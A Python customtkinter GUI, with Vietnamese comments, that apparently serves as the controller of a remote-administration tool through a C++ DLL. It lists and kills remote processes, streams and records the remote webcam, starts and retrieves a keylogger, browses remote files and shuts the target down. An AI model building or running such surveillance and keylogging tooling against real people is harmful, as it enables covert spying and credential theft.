import customtkinter as ctk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk, ImageFile
import ctypes
import os
import threading
import time
import sys
import cv2  # pip install opencv-python

# Cấu hình xử lý ảnh lỗi để không bị crash khi stream
ImageFile.LOAD_TRUNCATED_IMAGES = True
ctk.set_appearance_mode("Dark")

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
DLL_PATH = os.path.join(CURRENT_DIR, "client.dll")

# --- LOAD THƯ VIỆN DLL C++ ---
try:
    clib = ctypes.CDLL(DLL_PATH)
    clib.ConnectToIP.argtypes = [ctypes.c_char_p]
    clib.SendStringCmd.argtypes = [ctypes.c_char_p]
    clib.KillProcess.argtypes = [ctypes.c_char_p]
    clib.StartProcess.argtypes = [ctypes.c_char_p]
    clib.InitWinsock()
    clib.GetDrives.argtypes = []
    clib.ExplorePath.argtypes = [ctypes.c_char_p]
except Exception as e:
    messagebox.showerror("Lỗi", f"Lỗi DLL: {e}")
    sys.exit()

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Remote Control Ultimate - Video Recorder")
        self.geometry("1100x750")
        
        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        # --- MENU BÊN TRÁI ---
        self.sidebar = ctk.CTkFrame(self, width=200, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        
        ctk.CTkLabel(self.sidebar, text="CONTROL PANEL", font=("Arial", 20, "bold")).pack(pady=20)
        
        self.entry_ip = ctk.CTkEntry(self.sidebar, placeholder_text="IP Server")
        self.entry_ip.insert(0, "127.0.0.1")
        self.entry_ip.pack(pady=5)
        
        ctk.CTkButton(self.sidebar, text="KẾT NỐI", fg_color="green", command=self.connect).pack(pady=5)
        ctk.CTkButton(self.sidebar, text="NGẮT KẾT NỐI", fg_color="gray", command=self.disconnect).pack(pady=5)
        ctk.CTkButton(self.sidebar, text="☠ TẮT MÁY SERVER", fg_color="darkred", command=self.shutdown_sv).pack(pady=(50, 5))

        self.log_box = ctk.CTkTextbox(self.sidebar)
        self.log_box.pack(pady=20, padx=10, fill="both", expand=True)

        # --- TABS NỘI DUNG ---
        self.tabs = ctk.CTkTabview(self)
        self.tabs.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
        
        self.tab_proc = self.tabs.add("Tiến trình")
        self.tab_webcam = self.tabs.add("Webcam Recorder") # Tab Webcam xịn
        self.tab_key = self.tabs.add("Keylogger")
        self.tab_files = self.tabs.add("File Manager")
        
        self.setup_proc_tab()
        self.setup_webcam_tab()
        self.setup_key_tab()
        self.setup_file_tab()

    def log(self, msg):
        self.log_box.insert("end", f"> {msg}\n"); self.log_box.see("end")

    def connect(self):
        clib.ConnectToIP(self.entry_ip.get().encode('utf-8'))
        self.log("Đã gửi lệnh kết nối.")

    def disconnect(self):
        clib.CloseConnection()
        self.log("Đã ngắt.")

    def shutdown_sv(self):
        if messagebox.askyesno("Cảnh báo", "Tắt máy Server?"):
            clib.ShutdownServer()

    # ==========================================
    #   TAB WEBCAM (QUAN TRỌNG - ĐÃ SỬA LỖI)
    # ==========================================
    def setup_webcam_tab(self):
        ctl = ctk.CTkFrame(self.tab_webcam)
        ctl.pack(fill="x", padx=5, pady=5)
        
        # Nút Bật/Tắt Webcam
        self.btn_web_st = ctk.CTkButton(ctl, text="Bật Webcam", command=self.toggle_webcam)
        self.btn_web_st.pack(side="left", padx=5)
        
        # Nút Ghi Video
        self.btn_web_rec = ctk.CTkButton(ctl, text="🔴 Ghi Video (.avi)", fg_color="gray", state="disabled", command=self.toggle_web_rec)
        self.btn_web_rec.pack(side="left", padx=5)
        
        # Màn hình hiển thị
        self.lbl_web = ctk.CTkLabel(self.tab_webcam, text="[MÀN HÌNH ĐEN]", fg_color="black")
        self.lbl_web.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Bấm đúp để mở file video vừa quay
        self.lbl_web.bind("<Double-Button-1>", lambda e: os.startfile("webcam_record.avi") if os.path.exists("webcam_record.avi") else None)

        self.web_st = False   # Trạng thái đang xem
        self.web_rc = False   # Trạng thái đang ghi
        self.web_wr = None    # Biến ghi video (OpenCV VideoWriter)

    def toggle_webcam(self):
        if not self.web_st:
            # --- BẮT ĐẦU XEM ---
            self.web_st = True
            self.btn_web_st.configure(text="Tắt Webcam", fg_color="red")
            self.btn_web_rec.configure(state="normal", fg_color="#1f538d") # Cho phép ghi
            
            # Gọi C++ chạy ngầm để tải ảnh về file webcam.jpg liên tục
            threading.Thread(target=clib.ReceiveWebcamStream, daemon=True).start()
            
            # Bắt đầu vòng lặp cập nhật giao diện Python
            self.update_webcam_ui()
        else:
            # --- TẮT WEBCAM ---
            self.web_st = False
            self.web_rc = False # Dừng ghi nếu đang ghi
            
            # Lưu và đóng file video nếu có
            if self.web_wr: 
                self.web_wr.release()
                self.web_wr = None
                self.log("Đã lưu file video.")

            clib.SendStringCmd(b"STOP") # Gửi lệnh dừng cho Server
            self.btn_web_st.configure(text="Bật Webcam", fg_color="#1f538d")
            self.btn_web_rec.configure(state="disabled", text="🔴 Ghi Video (.avi)", fg_color="gray")

    def toggle_web_rec(self):
        if not self.web_rc:
            # Bắt đầu ghi
            self.web_rc = True
            self.btn_web_rec.configure(text="■ Dừng Ghi", fg_color="red")
            self.log("Đang ghi hình vào 'webcam_record.avi'...")
        else:
            # Dừng ghi
            self.web_rc = False
            if self.web_wr: 
                self.web_wr.release()
                self.web_wr = None
            self.btn_web_rec.configure(text="🔴 Ghi Video (.avi)", fg_color="#1f538d")
            self.log("Đã dừng ghi. File đã được lưu!")

    def update_webcam_ui(self):
        if not self.web_st: return
        
        path = "webcam.jpg"
        if os.path.exists(path):
            try:
                # Dùng OpenCV đọc ảnh (để lấy kích thước chuẩn)
                frame = cv2.imread(path)
                
                if frame is not None:
                    # 1. XỬ LÝ GHI VIDEO (NẾU ĐANG BẬT REC)
                    if self.web_rc:
                        if self.web_wr is None:
                            # Khởi tạo file video lần đầu tiên
                            h, w, _ = frame.shape
                            # Tạo file video AVI, tốc độ 10 khung hình/giây
                            self.web_wr = cv2.VideoWriter("webcam_record.avi", cv2.VideoWriter_fourcc(*'MJPG'), 10, (w, h))
                        
                        # Ghi frame hiện tại vào video
                        self.web_wr.write(frame)

                    # 2. XỬ LÝ HIỂN THỊ (RESIZE CHO VỪA MÀN HÌNH APP)
                    # Chuyển màu từ BGR (OpenCV) sang RGB (Pillow)
                    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img_pil = Image.fromarray(rgb_frame)
                    
                    # Tính toán kích thước hiển thị
                    w_win = self.lbl_web.winfo_width()
                    if w_win > 10:
                        # Giữ tỉ lệ khung hình (Webcam thường là 4:3 hoặc 16:9)
                        h_orig, w_orig, _ = frame.shape
                        ratio = h_orig / w_orig
                        h_new = int(w_win * ratio)
                        
                        ctk_img = ctk.CTkImage(light_image=img_pil, size=(w_win, h_new))
                        self.lbl_web.configure(image=ctk_img, text="")
            except:
                pass # Bỏ qua frame lỗi (do C++ đang ghi dở)
        
        # Gọi lại sau 50ms (khoảng 20 FPS)
        self.after(50, self.update_webcam_ui)

    def setup_file_tab(self):
        # Thanh địa chỉ và nút điều hướng
        nav_frame = ctk.CTkFrame(self.tab_files)
        nav_frame.pack(fill="x", padx=5, pady=5)

        ctk.CTkButton(nav_frame, text="⬅ Back", width=60, command=self.go_back).pack(side="left", padx=2)
        ctk.CTkButton(nav_frame, text="🏠 Drives", width=60, command=self.load_drives).pack(side="left", padx=2)
        
        self.lbl_path = ctk.CTkEntry(nav_frame)
        self.lbl_path.pack(side="left", fill="x", expand=True, padx=5)
        self.lbl_path.insert(0, "My Computer")
        self.lbl_path.configure(state="readonly")

        # Bảng dữ liệu File
        cols = ("Name", "Type", "Size")
        self.tree_file = ttk.Treeview(self.tab_files, columns=cols, show="headings", height=20)
        self.tree_file.heading("Name", text="Tên File / Thư mục")
        self.tree_file.heading("Type", text="Loại")
        self.tree_file.heading("Size", text="Kích thước (Bytes)")
        
        self.tree_file.column("Name", width=400)
        self.tree_file.column("Type", width=100)
        self.tree_file.column("Size", width=150)
        self.tree_file.pack(fill="both", expand=True, padx=5, pady=5)

        # Sự kiện Double Click để mở thư mục
        self.tree_file.bind("<Double-1>", self.on_file_double_click)
        
        self.current_path = "" # Lưu đường dẫn hiện tại
        
    # --- LOGIC XỬ LÝ FILE ---
    def load_drives(self):
        self.log("Đang lấy danh sách ổ đĩa...")
        self.current_path = "" # Reset về gốc
        self.lbl_path.configure(state="normal"); self.lbl_path.delete(0, "end"); self.lbl_path.insert(0, "My Computer"); self.lbl_path.configure(state="readonly")
        
        for i in self.tree_file.get_children(): self.tree_file.delete(i)

        def task():
            if os.path.exists("explorer.txt"): os.remove("explorer.txt")
            clib.GetDrives()
            time.sleep(0.5)
            self.update_file_ui()
        threading.Thread(target=task).start()

    def load_path(self, path):
        self.log(f"Đang mở: {path}")
        self.current_path = path
        self.lbl_path.configure(state="normal"); self.lbl_path.delete(0, "end"); self.lbl_path.insert(0, path); self.lbl_path.configure(state="readonly")
        
        for i in self.tree_file.get_children(): self.tree_file.delete(i)

        def task():
            if os.path.exists("explorer.txt"): os.remove("explorer.txt")
            clib.ExplorePath(path.encode('utf-8'))
            time.sleep(0.5)
            self.update_file_ui()
        threading.Thread(target=task).start()

    def update_file_ui(self):
        if os.path.exists("explorer.txt"):
            with open("explorer.txt", "r", encoding="utf-8", errors="ignore") as f: 
                lines = f.readlines()
            
            def ui():
                for line in lines:
                    parts = line.strip().split('|')
                    if len(parts) >= 3:
                        # Thêm icon (giả lập bằng text)
                        icon = "📁 " if parts[1] == "FOLDER" or parts[1] == "DRIVE" else "📄 "
                        self.tree_file.insert("", "end", values=(icon + parts[0], parts[1], parts[2]))
                self.log("Đã tải xong danh sách file.")
            self.after(0, ui)

    def on_file_double_click(self, event):
        # 1. Lấy danh sách các dòng đang chọn
        selection = self.tree_file.selection()
        
        # 2. KIỂM TRA: Nếu không chọn dòng nào (click vùng trắng) -> Thoát ngay
        if not selection:
            return 

        # 3. Nếu có chọn thì mới xử lý tiếp
        item_id = selection[0]
        item = self.tree_file.item(item_id, "values")
        
        if not item: return # Phòng trường hợp item rỗng

        name = item[0].replace("📁 ", "").replace("📄 ", "") # Bỏ icon
        type_ = item[1]

        if type_ == "DRIVE":
            # Nếu click ổ đĩa (C:\)
            self.load_path(name)
        elif type_ == "FOLDER":
            # Nếu click folder -> Ghép chuỗi đường dẫn
            new_path = os.path.join(self.current_path, name)
            # Fix lỗi đường dẫn Windows (đôi khi os.path.join dùng / thay vì \)
            new_path = new_path.replace("/", "\\") 
            if not new_path.endswith("\\"): new_path += "\\"
            self.load_path(new_path)
        else:
            self.log(f"Đây là file: {name}. (Chưa hỗ trợ tải về)")

    def go_back(self):
        if self.current_path == "" or len(self.current_path) <= 3:
            self.load_drives() # Quay về danh sách ổ đĩa
        else:
            parent = os.path.dirname(self.current_path.rstrip("\\"))
            if not parent.endswith("\\"): parent += "\\"
            self.load_path(parent)

    # --- TAB TIẾN TRÌNH & KEYLOG GIỮ NGUYÊN ---
    def setup_proc_tab(self):
        fr = ctk.CTkFrame(self.tab_proc); fr.pack(fill="x", padx=5, pady=5)
        ctk.CTkButton(fr, text="Refresh Apps", width=80, command=lambda: self.load_list(True)).pack(side="left", padx=2)
        ctk.CTkButton(fr, text="Refresh Proc", width=80, command=lambda: self.load_list(False)).pack(side="left", padx=2)
        self.ent_pid = ctk.CTkEntry(fr, placeholder_text="ID / Name", width=120); self.ent_pid.pack(side="left", padx=10)
        ctk.CTkButton(fr, text="Kill", width=60, fg_color="red", command=lambda: threading.Thread(target=lambda: clib.KillProcess(self.ent_pid.get().encode('utf-8'))).start()).pack(side="left", padx=2)
        ctk.CTkButton(fr, text="Start", width=60, fg_color="green", command=lambda: threading.Thread(target=lambda: clib.StartProcess(self.ent_pid.get().encode('utf-8'))).start()).pack(side="left", padx=2)
        self.tree = ttk.Treeview(self.tab_proc, columns=("ID","Name","Th"), show="headings", height=20)
        self.tree.heading("ID", text="ID"); self.tree.column("ID", width=80)
        self.tree.heading("Name", text="Tên"); self.tree.column("Name", width=400)
        self.tree.heading("Th", text="Threads"); self.tree.column("Th", width=80)
        self.tree.pack(fill="both", expand=True, padx=5, pady=5)
        self.tree.bind("<ButtonRelease-1>", lambda e: self.ent_pid.delete(0,"end") or self.ent_pid.insert(0, self.tree.item(self.tree.focus())['values'][0]) if self.tree.item(self.tree.focus())['values'] else None)

    def load_list(self, is_app):
        self.log("Đang tải danh sách...")
        for i in self.tree.get_children(): self.tree.delete(i)
        def task():
            fname = "apps.txt" if is_app else "process.txt"
            if os.path.exists(fname): os.remove(fname)
            if is_app: clib.GetAppList()
            else: clib.GetProcessList()
            time.sleep(1)
            if os.path.exists(fname):
                with open(fname, "r", errors="ignore") as f: 
                    for line in f:
                        p = line.strip().split('|')
                        if len(p)>=3: self.tree.insert("", "end", values=(p[0], p[1], p[2]))
                self.log("Tải xong.")
        threading.Thread(target=task).start()

    def setup_key_tab(self):
        fr = ctk.CTkFrame(self.tab_key); fr.pack(fill="x", padx=5, pady=5)
        ctk.CTkButton(fr, text="Bắt đầu Ghi (Hook)", fg_color="green", command=lambda: threading.Thread(target=clib.HookKeylog).start() or self.log("Bật Hook")).pack(side="left", padx=5)
        ctk.CTkButton(fr, text="Dừng Ghi (Unhook)", fg_color="gray", command=lambda: threading.Thread(target=clib.UnhookKeylog).start() or self.log("Tắt Hook")).pack(side="left", padx=5)
        ctk.CTkButton(fr, text="Tải Keylog", fg_color="#1f538d", command=self.load_keylog).pack(side="left", padx=20)
        self.txt_key = ctk.CTkTextbox(self.tab_key, font=("Consolas", 14)); self.txt_key.pack(fill="both", expand=True, padx=5, pady=5)

    def load_keylog(self):
        def task():
            if os.path.exists("keylog.txt"): os.remove("keylog.txt")
            clib.GetKeylog()
            time.sleep(1)
            if os.path.exists("keylog.txt"):
                with open("keylog.txt", "r", errors="ignore") as f: self.txt_key.delete("1.0", "end"); self.txt_key.insert("end", f.read())
        threading.Thread(target=task).start()

    def on_close(self):
        self.web_st = False; 
        if self.web_wr: self.web_wr.release()
        clib.CloseConnection(); self.destroy(); sys.exit()

if __name__ == "__main__":
    app = App()
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()